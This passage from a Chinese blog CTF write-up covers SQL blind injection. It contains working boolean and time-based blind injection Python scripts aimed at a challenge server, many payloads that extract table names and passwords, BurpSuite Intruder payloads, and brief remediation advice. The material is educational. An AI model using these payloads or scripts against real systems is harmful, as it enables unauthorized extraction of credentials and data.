class=line>postdata=&#123;</span><br><span class=line>    <span class=string>'username'</span>:<span class=string>'" or 1=1#'</span>,</span><br><span class=line>    <span class=string>'password'</span>:<span class=string>'admin'</span></span><br><span class=line>    &#125;</span><br><span class=line>url=<span class=string>"http://35.201.188.231:9000/challenge-02/post.php"</span></span><br><span class=line>r=requests.post(url,data=postdata)</span><br><span class=line>length=len(r.text)</span><br><span class=line></span><br><span class=line><span class=function><span class=keyword>def</span> <span class=title>name</span><span class=params>(url,length)</span>:</span></span><br><span class=line>    dbname=<span class=string>''</span></span><br><span class=line>    print(<span class=string>"数据库名："</span>,dbname)</span><br><span class=line>    payload=<span class=string>'" or ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125; #'</span></span><br><span class=line>    <span class=comment>#print("数据表名：",dbname)</span></span><br><span class=line>    <span class=comment>#payload='"or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;#'</span></span><br><span class=line>    <span class=comment>#print("字段名：",dbname)</span></span><br><span class=line>    <span class=comment>#payload='"or ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;#'</span></span><br><span class=line>    <span class=comment>#print("数据：",dbname)</span></span><br><span class=line>    <span class=comment>#payload='" or ascii(substr((select password from user_2 limit 1,1),&#123;0&#125;,1))=&#123;1&#125;#'</span></span><br><span class=line>    <span class=keyword>for</span> i <span class=keyword>in</span> range(<span class=number>1</span>,<span class=number>40</span>):</span><br><span class=line>        char=<span class=string>''</span></span><br><span class=line>        <span class=keyword>for</span> x <span class=keyword>in</span> chars:</span><br><span class=line>            char_ascii=ord(x)</span><br><span class=line>            payloads=payload.format(i,char_ascii)</span><br><span class=line>            postdata=&#123;</span><br><span class=line>            <span class=string>'username'</span>:payloads,</span><br><span class=line>            <span class=string>'password'</span>:<span class=string>'admin'</span></span><br><span class=line>            &#125;</span><br><span class=line>            r=requests.post(url,data=postdata)</span><br><span class=line>            <span class=keyword>if</span> len(r.text) == length:</span><br><span class=line>                dbname+=x</span><br><span class=line>                print(dbname)</span><br><span class=line>                char=x</span><br><span class=line>                <span class=keyword>break</span></span><br><span class=line>        <span class=keyword>if</span> char==<span class=string>''</span>:</span><br><span class=line>            <span class=keyword>break</span></span><br><span class=line>    <span class=keyword>return</span> dbname</span><br><span class=line>name(url,length)</span><br></pre></td></tr></table></figure><p>测试一下<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812222006-4862ce68-bd0c-1.jpg><br>如果传参方式是get传参，只需在url后添加<figure class="highlight plain"><figcaption><span>参数名</span></figcaption><table><tr><td class=code><pre><span class=line>##BASE-TIME-BLIND-INJECT</span><br><span class=line>###题目信息</span><br><span class=line>![](http://xzfile.aliyuncs.com/media/upload/picture/20190812222615-24388d2e-bd0d-1.jpg)</span><br><span class=line>###题干分析</span><br><span class=line>第二次走进误区，刚看到这道题的时候</span><br><span class=line>![](http://xzfile.aliyuncs.com/media/upload/picture/20190813202107-d389dec4-bdc4-1.jpg)</span><br><span class=line>从题目标题看出是时间盲注。试了单引号闭合和和双引号闭合，结果并没有什么用，于是查看了一下源码，发现关键点了。竟然有源码可以下载！</span><br><span class=line>![](http://xzfile.aliyuncs.com/media/upload/picture/20190812232412-3cba6e96-bd15-1.jpg)</span><br><span class=line>查看下载的源码，发现是 ```&apos;&quot;``` 闭合，并且传参为POST传参。</span><br><span class=line>![](http://xzfile.aliyuncs.com/media/upload/picture/20190812233736-1c2f449c-bd17-1.jpg)</span><br><span class=line>###知识了解</span><br><span class=line>**时间盲注**</span><br><span class=line>1. 时间盲注利用前提</span><br><span class=line>    页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。</span><br><span class=line>2. 时间盲注利用</span><br><span class=line>- 该语句判断数据库个数，当数据库个数等于n页面返回延迟5秒</span><br><span class=line>```sql</span><br><span class=line>if((select count(schema_name) from information_schema.schemata)=n,sleep(5),1)</span><br></pre></td></tr></table></figure></p><ul><li><p>该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟5秒</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>if((<span class=keyword>select</span> <span class=keyword>length</span>(schema_name) <span class=keyword>from</span> information_schema.schemata <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>)=n,<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)</span><br></pre></td></tr></table></figure></li><li><p>该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟5秒</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>if((<span class=keyword>select</span> <span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> schema_name <span class=keyword>from</span> information_schema.schemata <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>)))=n,<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>相关函数</strong></p><ul><li>Length（）函数 返回字符串的长度</li><li>substr（）截取字符串</li><li>ascii（）返回字符的ascii码</li><li>sleep(n)：将程序挂起一段时间 n为n秒</li><li>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li><li>count(column_name)函数返回指定列的值的数目(NULL 不计入)</li></ul><p>###开始测试</p><ol><li>测试语句<br>输入’” or if(1=1,sleep(5),1)#延迟5秒<br>输入’” or if(1=2,sleep(5),1)#正常</li><li>测长度<br>判断数据库名的长度<br>输入’” or if((length(database())=10),sleep(5),1)–+延迟5秒<br>说明长度为8。</li><li>测字符<br>用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码<br>输入’” or if((ascii(substr(database(),1,1))&gt;97),sleep(5),1)–+延迟5秒</li></ol><p>###盲注开始<br>####费心劳神-手工盲注<br>同样利用二分法进行手工盲注，与布尔盲注不同之处是页面上没有回显，所以使用了if()函数和sleep()函数，根据返回时间判断。同样可以使用BurpSuite进行测试。<br>1.猜库<br>用到获取当前数据库函数<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>- 猜库长</span><br><span class=line>```sql</span><br><span class=line>&apos;&quot; or if((length(database())=10),sleep(5),1)--+延迟5秒</span><br></pre></td></tr></table></figure></p><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812235329-5405abb6-bd19-1.jpg><br>所以数据库长度为10</p><ul><li>猜库名<br>第一个字符<figure class=highlight><table><tr><td class=code><pre><span class=line>'" or if((ascii(substr(database(),1,1))&gt;32),sleep(5),1)--+延迟5秒</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;128),sleep(5),1)--+正常</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;80),sleep(5),1)--+延迟5秒</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;104),sleep(5),1)--+正常</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;92),sleep(5),1)--+延迟5秒</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;98),sleep(5),1)--+延迟5秒</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;101),sleep(5),1)--+正常</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;100),sleep(5),1)--+正常</span><br><span class=line>'" or if((ascii(substr(database(),1,1))&gt;99),sleep(5),1)--+正常</span><br></pre></td></tr></table></figure></li></ul><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812235611-b4895e4c-bd19-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812235635-c2dfaf28-bd19-1.jpg><br>说明数据库名的第一个字符ASCII码为99，即“c”。<br>依次猜解，最终得到数据库名：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>2.猜表</span><br><span class=line></span><br><span class=line>- 猜表长</span><br><span class=line>```sql</span><br><span class=line>&apos;&quot; or if((length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6),sleep(5),1)--+延迟5秒</span><br></pre></td></tr></table></figure></p><p>所以数据表长度为6</p><ul><li>猜表名<br>第一个字符<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>'" or if((ascii(substr((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>104</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>119</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>117</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+正常</span></span><br></pre></td></tr></table></figure></li></ul><p>说明数据表名的第一个字符ASCII码为117，即“u”。<br>依次猜解，最终得到数据表名：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>3.猜字段</span><br><span class=line></span><br><span class=line>- 猜字段长</span><br><span class=line>```sql</span><br><span class=line>&apos;&quot; or if((length((select column_name from information_schema.columns where table_name=&apos;user_3&apos; and table_schema=database() limit 0,1))=2),sleep(5),1)--+延迟5秒</span><br></pre></td></tr></table></figure></p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>'" or if((length((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_3'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>))=<span class=number>8</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>'" or if((length((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_3'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>2</span>,<span class=number>1</span>))=<span class=number>8</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br></pre></td></tr></table></figure><p>所以user_3表的数据字段长度分别为2、8、8</p><ul><li>猜字段名<br>第一个字段<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>'" or if((ascii(substr((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_3'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select column_name from information_schema.columns where table_name='</span>user_3<span class=string>' and table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select column_name from information_schema.columns where table_name='user_3' and table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_3'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>104</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select column_name from information_schema.columns where table_name='</span>user_3<span class=string>' and table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select column_name from information_schema.columns where table_name='user_3' and table_schema=database() limit 0,1),1,1))&gt;110),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_3'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>107</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select column_name from information_schema.columns where table_name='</span>user_3<span class=string>' and table_schema=database() limit 0,1),1,1))&gt;106),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select column_name from information_schema.columns where table_name='user_3' and table_schema=database() limit 0,1),1,1))&gt;105),sleep(5),1)--+正常</span></span><br></pre></td></tr></table></figure></li></ul><p>所以user_3表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。<br>依次猜解,最终得到user_3表的3个字段名分别为：<figure class="highlight plain"><figcaption><span>```username``` ```password```</span></figcaption><table><tr><td class=code><pre><span class=line></span><br><span class=line>3.猜数据</span><br><span class=line></span><br><span class=line>- 猜数据长</span><br><span class=line>```sql</span><br><span class=line>&apos;&quot; or if((length((select password from challenges.user_3 limit 1,1))=25),sleep(5),1)--+延迟5秒</span><br></pre></td></tr></table></figure></p><p>所以user_3表的password字段的第2条数据的数据长度为25，这个应该就是flag那条数据了</p><ul><li>猜数据值<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>'" or if((ascii(substr((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_3 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;128),sleep(5),1)--+正常</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;80),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_3 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>104</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;92),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'</span><span class=string>" or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;98),sleep(5),1)--+延迟5秒</span></span><br><span class=line><span class=string>'"</span> <span class=keyword>or</span> <span class=keyword>if</span>((<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_3 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>101</span>),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+延迟5秒</span></span><br><span class=line><span class=string>'" or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;102),sleep(5),1)--+正常</span></span><br></pre></td></tr></table></figure></li></ul><p>说明user_3表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。<br>依次猜解,最终得到flag</p><p>####简便之法-BurpSuite半自动化盲注<br>和布尔盲注一样，时间盲注是不是也可以进行构造payload，并设置变量进行爆破呢？发现与布尔盲注不同之处就是使用了sleep()和if()。并且对爆破结果要根据返回时间进行整理排序。<br>1、爆库<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or if((ascii(substr(database(),§1§,1))=§32§),sleep(5),1)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><ol><li><p>先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813004830-03a339f6-bd21-1.jpg></p></li><li><p>设置Positions<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813004911-1c5cf446-bd21-1.jpg></p></li><li><p>设置两个变量的爆破类型<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813005009-3ec5b3e2-bd21-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813005024-4791b584-bd21-1.jpg></p></li><li><p>开始爆破，根据返回时间确定爆破结果<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813005056-5ad34cf2-bd21-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813005114-652b37be-bd21-1.jpg><br>凡是Timer&gt;10000的payload2即为数据库名的每个字符的ASCII</p></li><li><p>排序、转换字符<br>Timer&gt;10000的payload2每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg></p></li></ol><p>2、爆表<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or if((ascii(substr((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),§<span class=number>1</span>§,<span class=number>1</span>))=§<span class=number>32</span>§),<span class=keyword>sleep</span>(<span class=number>5</span>),<span class=number>1</span>)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><p>与爆库的不同之处就是payload和结果长度(结果长度由10改为6)。然后开始爆破，根据返回时间确定爆破结果。<br>最后排序、转换字符。最后得到表名为：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>3、爆字段</span><br><span class=line>payload</span><br><span class=line>```sql</span><br><span class=line>&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&apos;user_3&apos; and table_schema=database() limit 2,1),§1§,1))=§32§),sleep(5),1)--+</span><br></pre></td></tr></table></figure></p><p>上述payload爆第三个字段，与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)。<br>然后开始爆破，根据返回时间确定爆破结果。最后排序、转换字符，得到第三个字段为：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>3、爆数据</span><br><span class=line>payload</span><br><span class=line>```sql</span><br><span class=line>&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),§1§,1))=§32§),sleep(5),1)--+</span><br></pre></td></tr></table></figure></p><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为25)。然后开始爆破，根据返回时间确定爆破结果。<br>最后排序、转换字符，得到最终flag。<br><strong>提高效率</strong><br>当然时间盲注也可以用布尔盲注的那种方法提高效率，即选择不使用ascii()函数。与布尔盲注不同之处是使用了sleep()函数和if(expr1,expr2,expr3)函数。<br>####神来之笔-脚本盲注<br>和布尔盲注一样，是不是也可以写一个时间盲注脚本来提高效率呢？于是想到用python里的time.time()函数，返回当前时间的时间戳。记录提交和返回过程的时间差，然后进行判断。时间盲注脚本如下：</p><figure class="highlight python"><table><tr><td class=code><pre><span class=line><span class=keyword>import</span> requests</span><br><span class=line><span class=keyword>import</span> time</span><br><span class=line><span class=keyword>import</span> string</span><br><span class=line><span class=keyword>import</span> sys</span><br><span class=line>chars=<span class=string>'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;&#123;&#125;&amp;=+'</span></span><br><span class=line>url=<span class=string>"http://35.201.188.231:9000/challenge-03/post.php"</span></span><br><span class=line>dbname=<span class=string>''</span></span><br><span class=line>payload=<span class=string>"'\" or if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),1) #"</span></span><br><span class=line>print(<span class=string>"数据库名："</span>,dbname)</span><br><span class=line><span class=comment>#payload="'\"or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),1) #"</span></span><br><span class=line><span class=comment>#print("数据表名：",dbname)</span></span><br><span class=line><span class=comment>#payload="'\"or if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name="user_3" limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),1) #"</span></span><br><span class=line><span class=comment>#print("字段名：",dbname)</span></span><br><span class=line><span class=comment>#payload="'\" or if((ascii(substr((select password from user_3 limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),1) #"</span></span><br><span class=line><span class=comment>#print("数据：",dbname)</span></span><br><span class=line><span class=keyword>for</span> i <span class=keyword>in</span> range(<span class=number>1</span>,<span class=number>40</span>):</span><br><span class=line>    char=<span class=string>''</span></span><br><span class=line>    <span class=keyword>for</span> x <span class=keyword>in</span> chars:</span><br><span class=line>        char_ascii=ord(x)</span><br><span class=line>        payloads=payload.format(i,char_ascii)</span><br><span class=line>        start=time.time()</span><br><span class=line>        postdata=&#123;</span><br><span class=line>            <span class=string>'username'</span>:payloads,</span><br><span class=line>            <span class=string>'password'</span>:<span class=string>'admin'</span></span><br><span class=line>        &#125;</span><br><span class=line>        r=requests.post(url,data=postdata)</span><br><span class=line>        <span class=keyword>if</span> (time.time() - start)&gt;=<span class=number>5</span>:</span><br><span class=line>            dbname+=x</span><br><span class=line>            print(dbname)</span><br><span class=line>            char=x</span><br><span class=line>            <span class=keyword>break</span></span><br><span class=line>    <span class=keyword>if</span> char==<span class=string>''</span>:</span><br><span class=line>        <span class=keyword>break</span></span><br></pre></td></tr></table></figure><p>测试一下<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190813193259-1a4f83e2-bdbe-1.jpg><br>同样如果传参方式是get传参，只需在url后添加<figure class="highlight plain"><figcaption><span>参数名</span></figcaption><table><tr><td class=code><pre><span class=line>##SQL盲注的利用</span><br><span class=line>在一些SQL注入中往往有用到SQL盲注的方法，进行猜解数据库信息。比如在order by排序注入中，利用基于时间盲注的方法。</span><br><span class=line>```sql</span><br><span class=line>select * from users order by id desc;</span><br></pre></td></tr></table></figure></p><p>因为desc是可控的传参值。所以可进行注入<br>基于时间盲注</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>?order=if(1=1,1,sleep(5)) 正常响应时间</span><br><span class=line>?order=if(1=2,1,sleep(5)) 延迟5秒</span><br></pre></td></tr></table></figure><p>##SQL盲注漏洞的修复方案<br>SQL盲注的危害大家也都看到了，但是我们该如何防止这种情况的发生呢？<br>简单来讲，就是永远不要相信用户的输入。所以要对请求进行过滤，对参数进行验证，对非法字符进行拦截替换，清理用户输入的危险字符，保证sql能够在数据库中正确的编译和执行。这便是解决SQL盲注的简单思路。</p><p>当然，还有另一种方法，就是不使用SQL拼接语句。先在后台进行SQL查询，然后将查询结果与用户输入进行比对。<br>##总结<br>从两道SQL盲注的CTF题中，明白SQL盲注的三种解法，以及SQL盲注的危害和利用。同时也想到一些修复方案。<br>总之收获很大。但本人文采有限，操作生疏。若有任何不当之处，还望各位师傅指出。</p><div class=post-copyright><div class=content><p>最后更新： 2020年03月29日 01:11</p><p>原始链接： <a class=post-url href="/2019/10/26/SQL盲注的简单分析/" title=SQL盲注的简单分析>https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/</a></p><footer><a href=https://qwzf.github.io><img src=/images/logo.png alt=qwzf> qwzf</a></footer></div></div><div class=page-reward><a id=rewardBtn href=javascript:;>赏</a></div><div id=reward class="post-modal reward-lay"><a class=close href=javascript:; id=reward-close>×</a> <span class=reward-title><i class="icon icon-quote-left"></i> 请我吃糖~ <i class="icon icon-quote-right"></i></span><div class=reward-content><div class=reward-code><img id=rewardCode src=/images/wechat_code.jpg alt=打赏二维码></div><div class=reward-select><label class="reward-select-item checked" data-id=wechat data-wechat=/images/wechat_code.jpg><img class=reward-select-item-wechat src=/images/wechat.png alt=微信></label> <label class=reward-select-item data-id=alipay data-alipay=/images/alipay_code.jpg><img class=reward-select-item-alipay src=/images/alipay.png alt=支付宝></label></div></div></div></div><footer class=article-footer><div class=post-share><a href=javascript:; id=share-sub class=post-share-fab><i class="fa fa-share-alt"></i></a><div class=post-share-list id=share-list><ul class=share-icons><li><a class="weibo share-sns" target=_blank href="http://service.weibo.com/share/share.php?url=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/&title=《SQL盲注的简单分析》 — qwzf&pic=http://img-blog.csdnimg.cn/20200329003454768.png" data-title=微博><i class="fa fa-weibo"></i></a></li><li><a class="weixin share-sns" id=wxFab href=javascript:; data-title=微信><i class="fa fa-weixin"></i></a></li><li><a class="qq share-sns" target=_blank href="http://connect.qq.com/widget/shareqq/index.html?url=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/&title=《SQL盲注的简单分析》 — qwzf&source=" data-title=QQ><i class="fa fa-qq"></i></a></li><li><a class="facebook share-sns" target=_blank href="https://www.facebook.com/sharer/sharer.php?u=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/" data-title=Facebook><i class="fa fa-facebook"></i></a></li><li><a class="twitter share-sns" target=_blank href="https://twitter.com/intent/tweet?text=《SQL盲注的简单分析》 — qwzf&url=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/&via=https://qwzf.github.io" data-title=Twitter><i class="fa fa-twitter"></i></a></li><li><a class="google share-sns" target=_blank href="https://plus.google.com/share?url=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/" data-title=Google+><i class="fa fa-google-plus"></i></a></li></ul></div></div><div class="post-modal wx-share" id=wxShare><a class=close href=javascript:; id=wxShare-close>×</a><p>扫一扫，分享到微信</p><img src="//api.qrserver.com/v1/create-qr-code/?data=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/" alt=微信分享二维码></div><div class=mask></div><ul class=article-footer-menu><li class=article-footer-tags><i class="fa fa-tags"></i> <a href="/tags/BUG/" class=color4>BUG</a> <a href="/tags/SQL盲注/" class=color1>SQL盲注</a></li></ul></footer></div></article><aside class="post-toc-pos post-toc-top" id=post-toc><nav class=post-toc-wrap><ol class=post-toc><li class="post-toc-item post-toc-level-2"><a class=post-toc-link href=#前言><span class=post-toc-text>前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class=post-toc-link href=#BASE-Blind-Inject><span class=post-toc-text>BASE-Blind-Inject</span></a><ol class=post-toc-child><li class="post-toc-item post-toc-level-3"><a class=post-toc-link href=#题目信息><span class=post-toc-text>题目信息</span></a></li></ol></li></ol></nav></aside><nav id=article-nav><a href="/2019/10/27/从一道题到HTTP请求走私/" id=article-nav-newer class=article-nav-link-wrap><span 